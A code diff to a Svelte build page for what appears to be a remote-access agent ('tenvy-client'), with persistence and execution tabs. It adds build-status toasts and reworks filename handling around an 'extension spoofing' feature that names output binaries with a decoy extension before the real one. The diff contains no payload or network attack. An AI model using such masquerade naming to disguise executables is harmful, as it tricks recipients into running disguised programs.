@@ -30,6 +30,7 @@
 		Wand2
 	} from '@lucide/svelte';
 	import { onDestroy } from 'svelte';
+	import { toast } from 'svelte-sonner';
 	import ConnectionTab from './components/ConnectionTab.svelte';
 	import PersistenceTab from './components/PersistenceTab.svelte';
 	import ExecutionTab from './components/ExecutionTab.svelte';
@@ -129,26 +130,60 @@
 	let customCookies = $state<CookieKV[]>([{ name: '', value: '' }]);
 	let activeTab = $state<'connection' | 'persistence' | 'execution' | 'presentation'>('connection');
 
+	const KNOWN_EXTENSION_SUFFIXES = Array.from(
+		new Set(
+			Object.values(EXTENSION_OPTIONS_BY_OS)
+				.flat()
+				.map((extension) => extension.toLowerCase())
+		)
+	);
+
+	const SPOOF_PRESET_SUFFIXES = EXTENSION_SPOOF_PRESETS.map((preset) => preset.toLowerCase());
+
+	const activeSpoofExtension = $derived(
+		withPresetSpoofExtension(extensionSpoofingEnabled, extensionSpoofCustom, extensionSpoofPreset)
+	);
+
 	const sanitizedOutputBase = $derived.by(() => {
 		const trimmed = outputFilename.trim();
 		if (!trimmed) {
 			return 'tenvy-client';
 		}
 
-		const normalizedExtension = outputExtension.toLowerCase();
-		let base = trimmed;
-		if (normalizedExtension && trimmed.toLowerCase().endsWith(normalizedExtension)) {
-			base = trimmed.slice(0, -normalizedExtension.length);
+		let working = trimmed;
+		let normalized = working.toLowerCase();
+
+		const targetExtensions = EXTENSION_OPTIONS_BY_OS[targetOS] ?? [];
+		const normalizedCustomSpoof = normalizeSpoofExtension(extensionSpoofCustom)?.toLowerCase();
+
+		const suffixes = [
+			activeSpoofExtension.toLowerCase(),
+			normalizedCustomSpoof,
+			...SPOOF_PRESET_SUFFIXES,
+			...targetExtensions.map((extension) => extension.toLowerCase()),
+			...KNOWN_EXTENSION_SUFFIXES
+		];
+
+		const seen = new Set<string>();
+		for (const suffix of suffixes) {
+			if (!suffix || seen.has(suffix)) {
+				continue;
+			}
+			seen.add(suffix);
+
+			while (normalized.endsWith(suffix)) {
+				working = working.slice(0, -suffix.length);
+				normalized = working.toLowerCase();
+			}
 		}
 
-		const withoutTrailingDot = base.replace(/\.+$/, '');
-		const sanitized = withoutTrailingDot.trim();
+		const sanitized = working
+			.replace(/[^A-Za-z0-9._-]/g, '_')
+			.replace(/\.+$/, '')
+			.trim();
+
 		return sanitized || 'tenvy-client';
 	});
-
-	const activeSpoofExtension = $derived(
-		withPresetSpoofExtension(extensionSpoofingEnabled, extensionSpoofCustom, extensionSpoofPreset)
-	);
 
 	const effectiveOutputFilename = $derived(
 		`${sanitizedOutputBase}${activeSpoofExtension}${outputExtension}`
@@ -162,6 +197,11 @@
 	let downloadUrl = $state<string | null>(null);
 	let outputPath = $state<string | null>(null);
 	let buildLog = $state<string[]>([]);
+
+	const BUILD_STATUS_TOAST_ID = 'build-status-toast';
+
+	let lastToastedStatus: BuildStatus = 'idle';
+	let lastWarningSignature = '';
 
 	let progressMessages = $state<{ id: number; text: string; tone: 'info' | 'success' | 'error' }[]>(
 		[]
@@ -200,6 +240,78 @@
 		}
 
 		extensionSpoofError = validateSpoofExtension(extensionSpoofCustom) ?? null;
+	});
+
+	$effect(() => {
+		const status = buildStatus;
+
+		if (status === 'idle') {
+			if (lastToastedStatus !== 'idle') {
+				toast.dismiss(BUILD_STATUS_TOAST_ID);
+			}
+			lastToastedStatus = status;
+			return;
+		}
+
+		if (status === lastToastedStatus) {
+			return;
+		}
+
+		if (status === 'running') {
+			toast('Starting build…', {
+				id: BUILD_STATUS_TOAST_ID,
+				description: `Generating ${effectiveOutputFilename}`,
+				position: 'bottom-right',
+				duration: Infinity,
+				dismissible: false
+			});
+		} else if (status === 'success') {
+			const parts: string[] = [];
+			if (downloadUrl) {
+				parts.push('Download is ready.');
+			}
+			if (outputPath) {
+				parts.push(`Saved to ${outputPath}.`);
+			}
+			toast.success('Build completed', {
+				id: BUILD_STATUS_TOAST_ID,
+				description: parts.length > 0 ? parts.join(' ') : 'Agent binary is ready to deploy.',
+				position: 'bottom-right'
+			});
+		} else if (status === 'error') {
+			toast.error(buildError ?? 'Failed to build agent.', {
+				id: BUILD_STATUS_TOAST_ID,
+				position: 'bottom-right'
+			});
+		}
+
+		lastToastedStatus = status;
+	});
+
+	$effect(() => {
+		if (buildStatus !== 'success') {
+			lastWarningSignature = '';
+			return;
+		}
+
+		if (!buildWarnings.length) {
+			lastWarningSignature = '';
+			return;
+		}
+
+		const signature = buildWarnings.join('\u0000');
+		if (signature === lastWarningSignature) {
+			return;
+		}
+
+		for (const warning of buildWarnings) {
+			toast('Build warning', {
+				description: warning,
+				position: 'bottom-right'
+			});
+		}
+
+		lastWarningSignature = signature;
 	});
 
 	function resetProgress() {
@@ -631,20 +743,6 @@
 		return Info;
 	}
 
-	function buildStatusBadgeClasses(status: BuildStatus) {
-		if (status === 'success') return 'border-emerald-500/50 bg-emerald-500/10 text-emerald-600';
-		if (status === 'error') return 'border-red-500/60 bg-red-500/10 text-red-600';
-		if (status === 'running') return 'border-sky-500/60 bg-sky-500/10 text-sky-600';
-		return 'text-muted-foreground';
-	}
-
-	function buildStatusLabel(status: BuildStatus) {
-		if (status === 'success') return 'Complete';
-		if (status === 'error') return 'Error';
-		if (status === 'running') return 'Building';
-		return 'Idle';
-	}
-
 	function scheduleSecretCopyReset() {
 		if (secretCopyTimeout) {
 			clearTimeout(secretCopyTimeout);
@@ -681,6 +779,8 @@
 			clearTimeout(secretCopyTimeout);
 			secretCopyTimeout = null;
 		}
+
+		toast.dismiss(BUILD_STATUS_TOAST_ID);
 	});
 </script>
 
@@ -795,21 +895,17 @@
 				</div>
 				<aside class="space-y-4 xl:sticky xl:top-24">
 					<div class="space-y-4 rounded-lg border border-border/70 bg-background/60 p-6">
-						<div class="flex items-start justify-between gap-3">
-							<div class="space-y-1">
-								<h3 class="text-sm font-semibold">Build status</h3>
-								<p class="text-xs text-muted-foreground">
-									Monitor compilation progress and download artifacts.
-								</p>
-							</div>
-							<Badge variant="outline" class={buildStatusBadgeClasses(buildStatus)}
-								>{buildStatusLabel(buildStatus)}</Badge
-							>
+						<div class="space-y-2">
+							<h3 class="text-sm font-semibold">Build activity</h3>
+							<p class="text-xs text-muted-foreground">
+								Toast notifications fire as soon as the compiler updates your build. Review detailed
+								progress, logs, downloads, and secrets here.
+							</p>
 						</div>
 
 						{#if buildStatus === 'idle'}
 							<p class="text-xs text-muted-foreground">
-								Start a build to view progress updates, download links, and generated secrets.
+								Start a build to trigger live toasts and populate this panel with progress data.
 							</p>
 						{:else}
 							<div class="space-y-4">
